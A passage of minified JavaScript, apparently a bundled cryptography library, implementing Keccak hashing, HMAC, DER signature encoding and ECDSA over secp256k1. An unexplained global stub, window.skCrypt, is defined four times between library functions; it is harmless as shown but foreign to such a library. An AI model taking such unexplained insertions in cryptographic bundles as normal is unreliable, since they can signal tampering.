    ui.push(t);
  }
  const ci = Zt(ui, !0),
    li = ci[0],
    di = ci[1],
    fi = (t, e, n) =>
      n > 32
        ? ((t, e, n) => (e << (n - 32)) | (t >>> (64 - n)))(t, e, n)
        : ((t, e, n) => (t << n) | (e >>> (32 - n)))(t, e, n),
    hi = (t, e, n) =>
      n > 32
        ? ((t, e, n) => (t << (n - 32)) | (e >>> (64 - n)))(t, e, n)
        : ((t, e, n) => (e << n) | (t >>> (32 - n)))(t, e, n);
  class pi extends Dt {
    constructor(t, e, n, r = !1, o = 24) {
      if (
        (super(),
        (this.pos = 0),
        (this.posOut = 0),
        (this.finished = !1),
        (this.destroyed = !1),
        (this.enableXOF = !1),
        (this.blockLen = t),
        (this.suffix = e),
        (this.outputLen = n),
        (this.enableXOF = r),
        (this.rounds = o),
        mt(n),
        !(0 < t && t < 200))
      )
        throw new Error("only keccak-f1600 function is supported");
      var i;
      (this.state = new Uint8Array(200)),
        (this.state32 =
          ((i = this.state),
          new Uint32Array(
            i.buffer,
            i.byteOffset,
            Math.floor(i.byteLength / 4)
          )));
    }
    clone() {
      return this._cloneInto();
    }
    keccak() {
      It(this.state32),
        (function (t, e = 24) {
          const n = new Uint32Array(10);
          for (let r = 24 - e; r < 24; r++) {
            for (let r = 0; r < 10; r++)
              n[r] = t[r] ^ t[r + 10] ^ t[r + 20] ^ t[r + 30] ^ t[r + 40];
            for (let r = 0; r < 10; r += 2) {
              const e = (r + 8) % 10,
                o = (r + 2) % 10,
                i = n[o],
                s = n[o + 1],
                a = fi(i, s, 1) ^ n[e],
                u = hi(i, s, 1) ^ n[e + 1];
              for (let n = 0; n < 50; n += 10)
                (t[r + n] ^= a), (t[r + n + 1] ^= u);
            }
            let e = t[2],
              o = t[3];
            for (let n = 0; n < 24; n++) {
              const r = ai[n],
                i = fi(e, o, r),
                s = hi(e, o, r),
                a = si[n];
              (e = t[a]), (o = t[a + 1]), (t[a] = i), (t[a + 1] = s);
            }
            for (let r = 0; r < 50; r += 10) {
              for (let e = 0; e < 10; e++) n[e] = t[r + e];
              for (let e = 0; e < 10; e++)
                t[r + e] ^= ~n[(e + 2) % 10] & n[(e + 4) % 10];
            }
            (t[0] ^= li[r]), (t[1] ^= di[r]);
          }
          bt(n);
        })(this.state32, this.rounds),
        It(this.state32),
        (this.posOut = 0),
        (this.pos = 0);
    }
    update(t) {
      yt(this), gt((t = Lt(t)));
      const { blockLen: e, state: n } = this,
        r = t.length;
      for (let o = 0; o < r; ) {
        const i = Math.min(e - this.pos, r - o);
        for (let e = 0; e < i; e++) n[this.pos++] ^= t[o++];
        this.pos === e && this.keccak();
      }
      return this;
    }
    finish() {
      if (this.finished) return;
      this.finished = !0;
      const { state: t, suffix: e, pos: n, blockLen: r } = this;
      (t[n] ^= e),
        128 & e && n === r - 1 && this.keccak(),
        (t[r - 1] ^= 128),
        this.keccak();
    }
    writeInto(t) {
      yt(this, !1), gt(t), this.finish();
      const e = this.state,
        { blockLen: n } = this;
      for (let r = 0, o = t.length; r < o; ) {
        this.posOut >= n && this.keccak();
        const i = Math.min(n - this.posOut, o - r);
        t.set(e.subarray(this.posOut, this.posOut + i), r),
          (this.posOut += i),
          (r += i);
      }
      return t;
    }
    xofInto(t) {
      if (!this.enableXOF)
        throw new Error("XOF is not possible for this instance");
      return this.writeInto(t);
    }
    xof(t) {
      return mt(t), this.xofInto(new Uint8Array(t));
    }
    digestInto(t) {
      if ((wt(t, this), this.finished))
        throw new Error("digest() was already called");
      return this.writeInto(t), this.destroy(), t;
    }
    digest() {
      return this.digestInto(new Uint8Array(this.outputLen));
    }
    destroy() {
      (this.destroyed = !0), bt(this.state);
    }
    _cloneInto(t) {
      const {
        blockLen: e,
        suffix: n,
        outputLen: r,
        rounds: o,
        enableXOF: i,
      } = this;
      return (
        t || (t = new pi(e, n, r, i, o)),
        t.state32.set(this.state32),
        (t.pos = this.pos),
        (t.posOut = this.posOut),
        (t.finished = this.finished),
        (t.rounds = o),
        (t.suffix = n),
        (t.outputLen = r),
        (t.enableXOF = i),
        (t.destroyed = this.destroyed),
        t
      );
    }
  }
  const mi = (() => {
    return (t = 1), (e = 136), (n = 32), Ut(() => new pi(e, t, n));
    var t, e, n;
  })();
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  class gi extends Dt {
    constructor(t, e) {
      super(),
        (this.finished = !1),
        (this.destroyed = !1),
        (function (t) {
          if ("function" != typeof t || "function" != typeof t.create)
            throw new Error("Hash should be wrapped by utils.createHasher");
          mt(t.outputLen), mt(t.blockLen);
        })(t);
      const n = Lt(e);
      if (((this.iHash = t.create()), "function" != typeof this.iHash.update))
        throw new Error("Expected instance of class which extends utils.Hash");
      (this.blockLen = this.iHash.blockLen),
        (this.outputLen = this.iHash.outputLen);
      const r = this.blockLen,
        o = new Uint8Array(r);
      o.set(n.length > r ? t.create().update(n).digest() : n);
      for (let i = 0; i < o.length; i++) o[i] ^= 54;
      this.iHash.update(o), (this.oHash = t.create());
      for (let i = 0; i < o.length; i++) o[i] ^= 106;
      this.oHash.update(o), bt(o);
    }
    update(t) {
      return yt(this), this.iHash.update(t), this;
    }
    digestInto(t) {
      yt(this),
        gt(t, this.outputLen),
        (this.finished = !0),
        this.iHash.digestInto(t),
        this.oHash.update(t),
        this.oHash.digestInto(t),
        this.destroy();
    }
    digest() {
      const t = new Uint8Array(this.oHash.outputLen);
      return this.digestInto(t), t;
    }
    _cloneInto(t) {
      t || (t = Object.create(Object.getPrototypeOf(this), {}));
      const {
        oHash: e,
        iHash: n,
        finished: r,
        destroyed: o,
        blockLen: i,
        outputLen: s,
      } = this;
      return (
        t,
        (t.finished = r),
        (t.destroyed = o),
        (t.blockLen = i),
        (t.outputLen = s),
        (t.oHash = e._cloneInto(t.oHash)),
        (t.iHash = n._cloneInto(t.iHash)),
        t
      );
    }
    clone() {
      return this._cloneInto();
    }
    destroy() {
      (this.destroyed = !0), this.oHash.destroy(), this.iHash.destroy();
    }
  }
  const yi = (t, e, n) => new gi(t, e).update(n).digest();
  function wi(t) {
    void 0 !== t.lowS && Ae("lowS", t.lowS),
      void 0 !== t.prehash && Ae("prehash", t.prehash);
  }
  (yi.create = (t, e) => new gi(t, e)),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  class bi extends Error {
    constructor(t = "") {
      super(t);
    }
  }
  const vi = {
      Err: bi,
      _tlv: {
        encode: (t, e) => {
          const { Err: n } = vi;
          if (t < 0 || t > 256) throw new n("tlv.encode: wrong tag");
          if (1 & e.length) throw new n("tlv.encode: unpadded data");
          const r = e.length / 2,
            o = ke(r);
          if ((o.length / 2) & 128)
            throw new n("tlv.encode: long form length too big");
          const i = r > 127 ? ke((o.length / 2) | 128) : "";
          return ke(t) + i + o + e;
        },
        decode(t, e) {
          const { Err: n } = vi;
          let r = 0;
          if (t < 0 || t > 256) throw new n("tlv.encode: wrong tag");
          if (e.length < 2 || e[r++] !== t)
            throw new n("tlv.decode: wrong tlv");
          const o = e[r++];
          let i = 0;
          if (!!(128 & o)) {
            const t = 127 & o;
            if (!t)
              throw new n("tlv.decode(long): indefinite length not supported");
            if (t > 4) throw new n("tlv.decode(long): byte length is too big");
            const s = e.subarray(r, r + t);
            if (s.length !== t)
              throw new n("tlv.decode: length bytes not complete");
            if (0 === s[0]) throw new n("tlv.decode(long): zero leftmost byte");
            for (const e of s) i = (i << 8) | e;
            if (((r += t), i < 128))
              throw new n("tlv.decode(long): not minimal encoding");
          } else i = o;
          const s = e.subarray(r, r + i);
          if (s.length !== i) throw new n("tlv.decode: wrong value length");
          return { v: s, l: e.subarray(r + i) };
        },
      },
      _int: {
        encode(t) {
          const { Err: e } = vi;
          if (t < Ai) throw new e("integer: negative integers are not allowed");
          let n = ke(t);
          if ((8 & Number.parseInt(n[0], 16) && (n = "00" + n), 1 & n.length))
            throw new e("unexpected DER parsing assertion: unpadded hex");
          return n;
        },
        decode(t) {
          const { Err: e } = vi;
          if (128 & t[0]) throw new e("invalid signature integer: negative");
          if (0 === t[0] && !(128 & t[1]))
            throw new e("invalid signature integer: unnecessary leading zero");
          return Se(t);
        },
      },
      toSig(t) {
        const { Err: e, _int: n, _tlv: r } = vi,
          o = Ce("signature", t),
          { v: i, l: s } = r.decode(48, o);
        if (s.length)
          throw new e("invalid signature: left bytes after parsing");
        const { v: a, l: u } = r.decode(2, i),
          { v: c, l: l } = r.decode(2, u);
        if (l.length)
          throw new e("invalid signature: left bytes after parsing");
        return { r: n.decode(a), s: n.decode(c) };
      },
      hexFromSig(t) {
        const { _tlv: e, _int: n } = vi,
          r = e.encode(2, n.encode(t.r)) + e.encode(2, n.encode(t.s));
        return e.encode(48, r);
      },
    },
    Ai = BigInt(0),
    ki = BigInt(1),
    Ii = BigInt(2),
    Si = BigInt(3),
    _i = BigInt(4);
  function Ti(t, e, n) {
    const { BYTES: r } = t;
    return function (o) {
      let i;
      if ("bigint" == typeof o) i = o;
      else {
        let n = Ce("private key", o);
        if (e) {
          if (!e.includes(2 * n.length)) throw new Error("invalid private key");
          const t = new Uint8Array(r);
          t.set(n, t.length - n.length), (n = t);
        }
        try {
          i = t.fromBytes(n);
        } catch (s) {
          throw new Error(
            `invalid private key: expected ui8a of size ${r}, got ${typeof o}`
          );
        }
      }
      if ((n && (i = t.create(i)), !t.isValidNot0(i)))
        throw new Error("invalid private key: out of range [1..N-1]");
      return i;
    };
  }
  function Bi(t, e = {}) {
    const { Fp: n, Fn: r } = pn("weierstrass", t, e),
      { h: o, n: i } = t;
    Oe(
      e,
      {},
      {
        allowInfinityPoint: "boolean",
        clearCofactor: "function",
        isTorsionFree: "function",
        fromBytes: "function",
        toBytes: "function",
        endo: "object",
        wrapPrivateKey: "boolean",
      }
    );
    const { endo: s } = e;
    if (
      s &&
      (!n.is0(t.a) ||
        "bigint" != typeof s.beta ||
        "function" != typeof s.splitScalar)
    )
      throw new Error(
        'invalid endo: expected "beta": bigint and "splitScalar": function'
      );
    function a() {
      if (!n.isOdd)
        throw new Error(
          "compression is not supported: Field does not have .isOdd()"
        );
    }
    const u =
        e.toBytes ||
        function (t, e, r) {
          const { x: o, y: i } = e.toAffine(),
            s = n.toBytes(o);
          if ((Ae("isCompressed", r), r)) {
            a();
            return Nt(Ci(!n.isOdd(i)), s);
          }
          return Nt(Uint8Array.of(4), s, n.toBytes(i));
        },
      c =
        e.fromBytes ||
        function (t) {
          gt(t);
          const e = n.BYTES,
            r = e + 1,
            o = 2 * e + 1,
            i = t.length,
            s = t[0],
            u = t.subarray(1);
          if (i !== r || (2 !== s && 3 !== s)) {
            if (i === o && 4 === s) {
              const t = n.fromBytes(u.subarray(0 * e, 1 * e)),
                r = n.fromBytes(u.subarray(1 * e, 2 * e));
              if (!d(t, r)) throw new Error("bad point: is not on curve");
              return { x: t, y: r };
            }
            throw new Error(
              `bad point: got length ${i}, expected compressed=${r} or uncompressed=${o}`
            );
          }
          {
            const t = n.fromBytes(u);
            if (!n.isValid(t))
              throw new Error("bad point: is not on curve, wrong x");
            const e = l(t);
            let r;
            try {
              r = n.sqrt(e);
            } catch (c) {
              const t = c instanceof Error ? ": " + c.message : "";
              throw new Error("bad point: is not on curve, sqrt error" + t);
            }
            a();
            return !(1 & ~s) !== n.isOdd(r) && (r = n.neg(r)), { x: t, y: r };
          }
        },
      l = (function (t, e, n) {
        return function (r) {
          const o = t.sqr(r),
            i = t.mul(o, r);
          return t.add(t.add(i, t.mul(r, e)), n);
        };
      })(n, t.a, t.b);
    function d(t, e) {
      const r = n.sqr(e),
        o = l(t);
      return n.eql(r, o);
    }
    if (!d(t.Gx, t.Gy)) throw new Error("bad curve params: generator point");
    const f = n.mul(n.pow(t.a, Si), _i),
      h = n.mul(n.sqr(t.b), BigInt(27));
    if (n.is0(n.add(f, h))) throw new Error("bad curve params: a or b");
    function p(t, e, r = !1) {
      if (!n.isValid(e) || (r && n.is0(e)))
        throw new Error(`bad point coordinate ${t}`);
      return e;
    }
    function m(t) {
      if (!(t instanceof b)) throw new Error("ProjectivePoint expected");
    }
    const g = Re((t, e) => {
        const { px: r, py: o, pz: i } = t;
        if (n.eql(i, n.ONE)) return { x: r, y: o };
        const s = t.is0();
        null == e && (e = s ? n.ONE : n.inv(i));
        const a = n.mul(r, e),
          u = n.mul(o, e),
          c = n.mul(i, e);
        if (s) return { x: n.ZERO, y: n.ZERO };
        if (!n.eql(c, n.ONE)) throw new Error("invZ was invalid");
        return { x: a, y: u };
      }),
      y = Re((t) => {
        if (t.is0()) {
          if (e.allowInfinityPoint && !n.is0(t.py)) return;
          throw new Error("bad point: ZERO");
        }
        const { x: r, y: o } = t.toAffine();
        if (!n.isValid(r) || !n.isValid(o))
          throw new Error("bad point: x or y not field elements");
        if (!d(r, o)) throw new Error("bad point: equation left != right");
        if (!t.isTorsionFree())
          throw new Error("bad point: not in prime-order subgroup");
        return !0;
      });
    function w(t, e, r, o, i) {
      return (
        (r = new b(n.mul(r.px, t), r.py, r.pz)),
        (e = en(o, e)),
        (r = en(i, r)),
        e.add(r)
      );
    }
    class b {
      constructor(t, e, n) {
        (this.px = p("x", t)),
          (this.py = p("y", e, !0)),
          (this.pz = p("z", n)),
          Object.freeze(this);
      }
      static fromAffine(t) {
        const { x: e, y: r } = t || {};
        if (!t || !n.isValid(e) || !n.isValid(r))
          throw new Error("invalid affine point");
        if (t instanceof b) throw new Error("projective point not allowed");
        return n.is0(e) && n.is0(r) ? b.ZERO : new b(e, r, n.ONE);
      }
      get x() {
        return this.toAffine().x;
      }
      get y() {
        return this.toAffine().y;
      }
      static normalizeZ(t) {
        return nn(b, "pz", t);
      }
      static fromBytes(t) {
        return gt(t), b.fromHex(t);
      }
      static fromHex(t) {
        const e = b.fromAffine(c(Ce("pointHex", t)));
        return e.assertValidity(), e;
      }
      static fromPrivateKey(t) {
        const n = Ti(r, e.allowedPrivateKeyLengths, e.wrapPrivateKey);
        return b.BASE.multiply(n(t));
      }
      static msm(t, e) {
        return fn(b, r, t, e);
      }
      precompute(t = 8, e = !0) {
        return A.setWindowSize(this, t), e || this.multiply(Si), this;
      }
      _setWindowSize(t) {
        this.precompute(t);
      }
      assertValidity() {
        y(this);
      }
      hasEvenY() {
        const { y: t } = this.toAffine();
        if (!n.isOdd) throw new Error("Field doesn't support isOdd");
        return !n.isOdd(t);
      }
      equals(t) {
        m(t);
        const { px: e, py: r, pz: o } = this,
          { px: i, py: s, pz: a } = t,
          u = n.eql(n.mul(e, a), n.mul(i, o)),
          c = n.eql(n.mul(r, a), n.mul(s, o));
        return u && c;
      }
      negate() {
        return new b(this.px, n.neg(this.py), this.pz);
      }
      double() {
        const { a: e, b: r } = t,
          o = n.mul(r, Si),
          { px: i, py: s, pz: a } = this;
        let u = n.ZERO,
          c = n.ZERO,
          l = n.ZERO,
          d = n.mul(i, i),
          f = n.mul(s, s),
          h = n.mul(a, a),
          p = n.mul(i, s);
        return (
          (p = n.add(p, p)),
          (l = n.mul(i, a)),
          (l = n.add(l, l)),
          (u = n.mul(e, l)),
          (c = n.mul(o, h)),
          (c = n.add(u, c)),
          (u = n.sub(f, c)),
          (c = n.add(f, c)),
          (c = n.mul(u, c)),
          (u = n.mul(p, u)),
          (l = n.mul(o, l)),
          (h = n.mul(e, h)),
          (p = n.sub(d, h)),
          (p = n.mul(e, p)),
          (p = n.add(p, l)),
          (l = n.add(d, d)),
          (d = n.add(l, d)),
          (d = n.add(d, h)),
          (d = n.mul(d, p)),
          (c = n.add(c, d)),
          (h = n.mul(s, a)),
          (h = n.add(h, h)),
          (d = n.mul(h, p)),
          (u = n.sub(u, d)),
          (l = n.mul(h, f)),
          (l = n.add(l, l)),
          (l = n.add(l, l)),
          new b(u, c, l)
        );
      }
      add(e) {
        m(e);
        const { px: r, py: o, pz: i } = this,
          { px: s, py: a, pz: u } = e;
        let c = n.ZERO,
          l = n.ZERO,
          d = n.ZERO;
        const f = t.a,
          h = n.mul(t.b, Si);
        let p = n.mul(r, s),
          g = n.mul(o, a),
          y = n.mul(i, u),
          w = n.add(r, o),
          v = n.add(s, a);
        (w = n.mul(w, v)),
          (v = n.add(p, g)),
          (w = n.sub(w, v)),
          (v = n.add(r, i));
        let A = n.add(s, u);
        return (
          (v = n.mul(v, A)),
          (A = n.add(p, y)),
          (v = n.sub(v, A)),
          (A = n.add(o, i)),
          (c = n.add(a, u)),
          (A = n.mul(A, c)),
          (c = n.add(g, y)),
          (A = n.sub(A, c)),
          (d = n.mul(f, v)),
          (c = n.mul(h, y)),
          (d = n.add(c, d)),
          (c = n.sub(g, d)),
          (d = n.add(g, d)),
          (l = n.mul(c, d)),
          (g = n.add(p, p)),
          (g = n.add(g, p)),
          (y = n.mul(f, y)),
          (v = n.mul(h, v)),
          (g = n.add(g, y)),
          (y = n.sub(p, y)),
          (y = n.mul(f, y)),
          (v = n.add(v, y)),
          (p = n.mul(g, v)),
          (l = n.add(l, p)),
          (p = n.mul(A, v)),
          (c = n.mul(w, c)),
          (c = n.sub(c, p)),
          (p = n.mul(w, g)),
          (d = n.mul(A, d)),
          (d = n.add(d, p)),
          new b(c, l, d)
        );
      }
      subtract(t) {
        return this.add(t.negate());
      }
      is0() {
        return this.equals(b.ZERO);
      }
      multiply(t) {
        const { endo: n } = e;
        if (!r.isValidNot0(t)) throw new Error("invalid scalar: out of range");
        let o, i;
        const s = (t) => A.wNAFCached(this, t, b.normalizeZ);
        if (n) {
          const { k1neg: e, k1: r, k2neg: a, k2: u } = n.splitScalar(t),
            { p: c, f: l } = s(r),
            { p: d, f: f } = s(u);
          (i = l.add(f)), (o = w(n.beta, c, d, e, a));
        } else {
          const { p: e, f: n } = s(t);
          (o = e), (i = n);
        }
        return b.normalizeZ([o, i])[0];
      }
      multiplyUnsafe(t) {
        const { endo: n } = e,
          o = this;
        if (!r.isValid(t)) throw new Error("invalid scalar: out of range");
        if (t === Ai || o.is0()) return b.ZERO;
        if (t === ki) return o;
        if (A.hasPrecomputes(this)) return this.multiply(t);
        if (n) {
          const { k1neg: e, k1: r, k2neg: i, k2: s } = n.splitScalar(t),
            { p1: a, p2: u } = (function (t, e, n, r) {
              let o = e,
                i = t.ZERO,
                s = t.ZERO;
              for (; n > $e || r > $e; )
                n & tn && (i = i.add(o)),
                  r & tn && (s = s.add(o)),
                  (o = o.double()),
                  (n >>= tn),
                  (r >>= tn);
              return { p1: i, p2: s };
            })(b, o, r, s);
          return w(n.beta, a, u, e, i);
        }
        return A.wNAFCachedUnsafe(o, t);
      }
      multiplyAndAddUnsafe(t, e, n) {
        const r = this.multiplyUnsafe(e).add(t.multiplyUnsafe(n));
        return r.is0() ? void 0 : r;
      }
      toAffine(t) {
        return g(this, t);
      }
      isTorsionFree() {
        const { isTorsionFree: t } = e;
        return o === ki || (t ? t(b, this) : A.wNAFCachedUnsafe(this, i).is0());
      }
      clearCofactor() {
        const { clearCofactor: t } = e;
        return o === ki ? this : t ? t(b, this) : this.multiplyUnsafe(o);
      }
      toBytes(t = !0) {
        return Ae("isCompressed", t), this.assertValidity(), u(b, this, t);
      }
      toRawBytes(t = !0) {
        return this.toBytes(t);
      }
      toHex(t = !0) {
        return Tt(this.toBytes(t));
      }
      toString() {
        return `<Point ${this.is0() ? "ZERO" : this.toHex()}>`;
      }
    }
    (b.BASE = new b(t.Gx, t.Gy, n.ONE)),
      (b.ZERO = new b(n.ZERO, n.ONE, n.ZERO)),
      (b.Fp = n),
      (b.Fn = r);
    const v = r.BITS,
      A = dn(b, e.endo ? Math.ceil(v / 2) : v);
    return b;
  }
  function Ci(t) {
    return Uint8Array.of(t ? 2 : 3);
  }
  function Ei(t, e, n = {}) {
    Oe(
      e,
      { hash: "function" },
      {
        hmac: "function",
        lowS: "boolean",
        randomBytes: "function",
        bits2int: "function",
        bits2int_modN: "function",
      }
    );
    const r = e.randomBytes || qt,
      o = e.hmac || ((t, ...n) => yi(e.hash, t, Nt(...n))),
      { Fp: i, Fn: s } = t,
      { ORDER: a, BITS: u } = s;
    function c(t) {
      return t > a >> ki;
    }
    function l(t, e) {
      if (!s.isValidNot0(e))
        throw new Error(`invalid signature ${t}: out of range 1..CURVE.n`);
    }
    class d {
      constructor(t, e, n) {
        l("r", t),
          l("s", e),
          (this.r = t),
          (this.s = e),
          null != n && (this.recovery = n),
          Object.freeze(this);
      }
      static fromCompact(t) {
        const e = s.BYTES,
          n = Ce("compactSignature", t, 2 * e);
        return new d(
          s.fromBytes(n.subarray(0, e)),
          s.fromBytes(n.subarray(e, 2 * e))
        );
      }
      static fromDER(t) {
        const { r: e, s: n } = vi.toSig(Ce("DER", t));
        return new d(e, n);
      }
      assertValidity() {}
      addRecoveryBit(t) {
        return new d(this.r, this.s, t);
      }
      recoverPublicKey(e) {
        const n = i.ORDER,
          { r: r, s: o, recovery: u } = this;
        if (null == u || ![0, 1, 2, 3].includes(u))
          throw new Error("recovery id invalid");
        if (a * Ii < n && u > 1)
          throw new Error("recovery id is ambiguous for h>1 curve");
        const c = 2 === u || 3 === u ? r + a : r;
        if (!i.isValid(c)) throw new Error("recovery id 2 or 3 invalid");
        const l = i.toBytes(c),
          d = t.fromHex(Nt(Ci(!(1 & u)), l)),
          f = s.inv(c),
          h = g(Ce("msgHash", e)),
          p = s.create(-h * f),
          m = s.create(o * f),
          y = t.BASE.multiplyUnsafe(p).add(d.multiplyUnsafe(m));
        if (y.is0()) throw new Error("point at infinify");
        return y.assertValidity(), y;
      }
      hasHighS() {
        return c(this.s);
      }
      normalizeS() {
        return this.hasHighS()
          ? new d(this.r, s.neg(this.s), this.recovery)
          : this;
      }
      toBytes(t) {
        if ("compact" === t) return Nt(s.toBytes(this.r), s.toBytes(this.s));
        if ("der" === t) return Mt(vi.hexFromSig(this));
        throw new Error("invalid format");
      }
      toDERRawBytes() {
        return this.toBytes("der");
      }
      toDERHex() {
        return Tt(this.toBytes("der"));
      }
      toCompactRawBytes() {
        return this.toBytes("compact");
      }
      toCompactHex() {
        return Tt(this.toBytes("compact"));
      }
    }
    const f = Ti(s, n.allowedPrivateKeyLengths, n.wrapPrivateKey),
      h = {
        isValidPrivateKey(t) {
          try {
            return f(t), !0;
          } catch (e) {
            return !1;
          }
        },
        normPrivateKeyToScalar: f,
        randomPrivateKey: () => {
          const t = a;
          return (function (t, e, n = !1) {
            const r = t.length,
              o = Ye(e),
              i = Qe(e);
            if (r < 16 || r < i || r > 1024)
              throw new Error(
                "expected " + i + "-1024 bytes of input, got " + r
              );
            const s = Ke(n ? _e(t) : Se(t), e - Le) + Le;
            return n ? Be(s, o) : Te(s, o);
          })(r(Qe(t)), t);
        },
        precompute: (e = 8, n = t.BASE) => n.precompute(e, !1),
      };
    function p(e) {
      if ("bigint" == typeof e) return !1;
      if (e instanceof t) return !0;
      const r = Ce("key", e).length,
        o = i.BYTES,
        a = o + 1,
        u = 2 * o + 1;
      return n.allowedPrivateKeyLengths || s.BYTES === a
        ? void 0
        : r === a || r === u;
    }
    const m =
        e.bits2int ||
        function (t) {
          if (t.length > 8192) throw new Error("input is too large");
          const e = Se(t),
            n = 8 * t.length - u;
          return n > 0 ? e >> BigInt(n) : e;
        },
      g =
        e.bits2int_modN ||
        function (t) {
          return s.create(m(t));
        },
      y = Pe(u);
    function w(t) {
      return xe("num < 2^" + u, t, Ai, y), s.toBytes(t);
    }
    function b(n, o, a = v) {
      if (["recovered", "canonical"].some((t) => t in a))
        throw new Error("sign() legacy options not supported");
      const { hash: u } = e;
      let { lowS: l, prehash: h, extraEntropy: p } = a;
      null == l && (l = !0),
        (n = Ce("msgHash", n)),
        wi(a),
        h && (n = Ce("prehashed msgHash", u(n)));
      const y = g(n),
        b = f(o),
        A = [w(b), w(y)];
      if (null != p && !1 !== p) {
        const t = !0 === p ? r(i.BYTES) : p;
        A.push(Ce("extraEntropy", t));
      }
      const k = Nt(...A),
        I = y;
      return {
        seed: k,
        k2sig: function (e) {
          const n = m(e);
          if (!s.isValidNot0(n)) return;
          const r = s.inv(n),
            o = t.BASE.multiply(n).toAffine(),
            i = s.create(o.x);
          if (i === Ai) return;
          const a = s.create(r * s.create(I + i * b));
          if (a === Ai) return;
          let u = (o.x === i ? 0 : 2) | Number(o.y & ki),
            f = a;
          return (
            l &&
              c(a) &&
              ((f = (function (t) {
                return c(t) ? s.neg(t) : t;
              })(a)),
              (u ^= 1)),
            new d(i, f, u)
          );
        },
      };
    }
    const v = { lowS: e.lowS, prehash: !1 },
      A = { lowS: e.lowS, prehash: !1 };
    return (
      t.BASE.precompute(8),
      Object.freeze({
        getPublicKey: function (e, n = !0) {
          return t.fromPrivateKey(e).toBytes(n);
        },
        getSharedSecret: function (e, n, r = !0) {
          if (!0 === p(e)) throw new Error("first arg must be private key");
          if (!1 === p(n)) throw new Error("second arg must be public key");
          return t.fromHex(n).multiply(f(e)).toBytes(r);
        },
        sign: function (t, n, r = v) {
          const { seed: i, k2sig: a } = b(t, n, r);
          return (function (t, e, n) {
            if ("number" != typeof t || t < 2)
              throw new Error("hashLen must be a number");
            if ("number" != typeof e || e < 2)
              throw new Error("qByteLen must be a number");
            if ("function" != typeof n)
              throw new Error("hmacFn must be a function");
            const r = (t) => new Uint8Array(t),
              o = (t) => Uint8Array.of(t);
            let i = r(t),
              s = r(t),
              a = 0;
            const u = () => {
                i.fill(1), s.fill(0), (a = 0);
              },
              c = (...t) => n(s, i, ...t),
              l = (t = r(0)) => {
                (s = c(o(0), t)),
                  (i = c()),
                  0 !== t.length && ((s = c(o(1), t)), (i = c()));
              },
              d = () => {
                if (a++ >= 1e3) throw new Error("drbg: tried 1000 values");
                let t = 0;
                const n = [];
                for (; t < e; ) {
                  i = c();
                  const e = i.slice();
                  n.push(e), (t += i.length);
                }
                return Nt(...n);
              };
            return (t, e) => {
              let n;
              for (u(), l(t); !(n = e(d())); ) l();
              return u(), n;
            };
          })(
            e.hash.outputLen,
            s.BYTES,
            o
          )(i, a);
        },
        verify: function (n, r, o, i = A) {
          const a = n;
          (r = Ce("msgHash", r)), (o = Ce("publicKey", o)), wi(i);
          const { lowS: u, prehash: c, format: l } = i;
          if ("strict" in i)
            throw new Error("options.strict was renamed to lowS");
          if (void 0 !== l && !["compact", "der", "js"].includes(l))
            throw new Error('format must be "compact", "der" or "js"');
          const f = "string" == typeof a || pt(a),
            h =
              !f &&
              !l &&
              "object" == typeof a &&
              null !== a &&
              "bigint" == typeof a.r &&
              "bigint" == typeof a.s;
          if (!f && !h)
            throw new Error(
              "invalid signature, expected Uint8Array, hex string or Signature instance"
            );
          let p, m;
          try {
            if (h) {
              if (void 0 !== l && "js" !== l) throw new Error("invalid format");
              p = new d(a.r, a.s);
            }
            if (f) {
              try {
                "compact" !== l && (p = d.fromDER(a));
              } catch (_) {
                if (!(_ instanceof vi.Err)) throw _;
              }
              p || "der" === l || (p = d.fromCompact(a));
            }
            m = t.fromHex(o);
          } catch (T) {
            return !1;
          }
          if (!p) return !1;
          if (u && p.hasHighS()) return !1;
          c && (r = e.hash(r));
          const { r: y, s: w } = p,
            b = g(r),
            v = s.inv(w),
            k = s.create(b * v),
            I = s.create(y * v),
            S = t.BASE.multiplyUnsafe(k).add(m.multiplyUnsafe(I));
          return !S.is0() && s.create(S.x) === y;
        },
        utils: h,
        Point: t,
        Signature: d,
      })
    );
  }
  function xi(t) {
    const { CURVE: e, curveOpts: n } = (function (t) {
      const e = {
        a: t.a,
        b: t.b,
        p: t.Fp.ORDER,
        n: t.n,
        h: t.h,
        Gx: t.Gx,
        Gy: t.Gy,
      };
      return {
        CURVE: e,
        curveOpts: {
          Fp: t.Fp,
          Fn: Je(e.n, t.nBitLength),
          allowedPrivateKeyLengths: t.allowedPrivateKeyLengths,
          allowInfinityPoint: t.allowInfinityPoint,
          endo: t.endo,
          wrapPrivateKey: t.wrapPrivateKey,
          isTorsionFree: t.isTorsionFree,
          clearCofactor: t.clearCofactor,
          fromBytes: t.fromBytes,
          toBytes: t.toBytes,
        },
      };
    })(t);
    return {
      CURVE: e,
      curveOpts: n,
      ecdsaOpts: {
        hash: t.hash,
        hmac: t.hmac,
        randomBytes: t.randomBytes,
        lowS: t.lowS,
        bits2int: t.bits2int,
        bits2int_modN: t.bits2int_modN,
      },
    };
  }
  function Pi(t) {
    const { CURVE: e, curveOpts: n, ecdsaOpts: r } = xi(t);
    return (function (t, e) {
      return Object.assign({}, e, { ProjectivePoint: e.Point, CURVE: t });
    })(t, Ei(Bi(e, n), r, n));
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const Oi = {
    p: BigInt(
      "0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"
    ),
    n: BigInt(
      "0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"
    ),
    h: BigInt(1),
    a: BigInt(0),
    b: BigInt(7),
    Gx: BigInt(
      "0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"
    ),
    Gy: BigInt(
      "0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8"
    ),
  };
  BigInt(0);
  const Ri = BigInt(1),
    Mi = BigInt(2),
    Li = (t, e) => (t + e / Mi) / e;
  const Ni = Je(Oi.p, void 0, void 0, {
      sqrt: function (t) {
        const e = Oi.p,
          n = BigInt(3),
          r = BigInt(6),
          o = BigInt(11),
          i = BigInt(22),
          s = BigInt(23),
          a = BigInt(44),
          u = BigInt(88),
          c = (t * t * t) % e,
          l = (c * c * t) % e,
          d = (We(l, n, e) * l) % e,
          f = (We(d, n, e) * l) % e,
          h = (We(f, Mi, e) * c) % e,
          p = (We(h, o, e) * h) % e,
          m = (We(p, i, e) * p) % e,
